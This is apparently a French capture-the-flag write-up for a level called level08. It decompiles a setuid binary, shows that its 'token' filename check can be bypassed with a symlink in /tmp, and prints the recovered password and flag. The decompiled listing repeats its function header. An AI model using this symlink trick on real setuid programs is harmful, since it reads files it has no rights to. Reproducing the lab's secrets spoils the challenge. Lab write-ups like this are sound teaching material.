## LEVEL08

- Dans ce level, un binaire nommé `level08` et un fichier nommé `token` se trouvent dans le home : 
```bash
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

- Le + indique des ACL (Access Control List) étendues qu'on peut afficher avec `getfacl <nom du fichier>`

```bash
# file: level08
# owner: flag08
# group: level08
# flags: ss-
user::rwx
group::---
group:level08:r-x
group:flag08:r-x
mask::r-x
other::---
```
- La lecture et l'execution est possible pour level08, malgré --- pour le groupe classique
- Le fichier token appartient à flag08 et ucun droit pour les groupes ni pour les autres.

- On utilise ghidra comme pour le level précédent pour décompiler et comprendre ce que fait le binaire :
```c
int main(int argc,char **argv,char **envp)

{

int main(int argc,char **argv,char **envp)

{
  char *pcVar1;
  int __fd;
  size_t __n;
  ssize_t sVar2;
  int in_GS_OFFSET;
  undefined1 local_414 [1024];
  int local_14;
  
                    /* Unresolved local var: char[1024] buf@[DW_OP_breg4(ESP): +44]
                       Unresolved local var: int fd@[DW_OP_breg4(ESP): +36]
                       Unresolved local var: int rc@[DW_OP_breg4(ESP): +40] */
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (argc == 1) {
    printf("%s [file to read]\n",*argv);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pcVar1 = strstr(argv[1],"token");
  if (pcVar1 != (char *)0x0) {
    printf("You may not access \'%s\'\n",argv[1]);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  __fd = open(argv[1],0);
  if (__fd == -1) {
    err(1,"Unable to open %s",argv[1]);
  }
  __n = read(__fd,local_414,0x400);
  if (__n == 0xffffffff) {
    err(1,"Unable to read fd %d",__fd);
  }
  sVar2 = write(1,local_414,__n);
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return sVar2;
}
```

- On voit que le binaire est un programme qui prend comme argument un fichier à lire.
- Ensuite il vérifie que le nom du fichier contient la sous-chaîne `"token"` avec strstr et refuse de l'ouvrir si c'est le cas.  
Sinon il l’ouvre, le lit et affiche avec write son contenu.


## EXPLOITATION
- Il faut trouver un moyen pour que le nom du fichier ne contienne pas la sous-chaîne `"token"`.  
Mais on a aucun droit sur le fichier `token`, on peut donc pas le renommer.
- open() par defaut suit automatiquement les liens symbolique, on crée donc un lien symbolique vers le fichier `token`.

```bash
ln -s /home/user/level08/token /tmp/flag
```
- Ce lien se nomme flag et contient le chemin vers le fichier token.
- On a juste a lancer le programme avec ce lien pour avoir le contenu du fichier token : 
```bash
./level08 /tmp/flag
quif5eloekouj29ke0vouxean
```

- Ce token n'est pas le flag08 mais le mot de passe permetyant d’accéder a flag08: 
```bash
su flag08
Password: 
Don't forget to launch getflag !
```
- Ayant acces a flag08 on peut donc ensuite lancer getflag.


## FLAG 

- 25749xKZ8L7DkSCwJkT9dyv6f

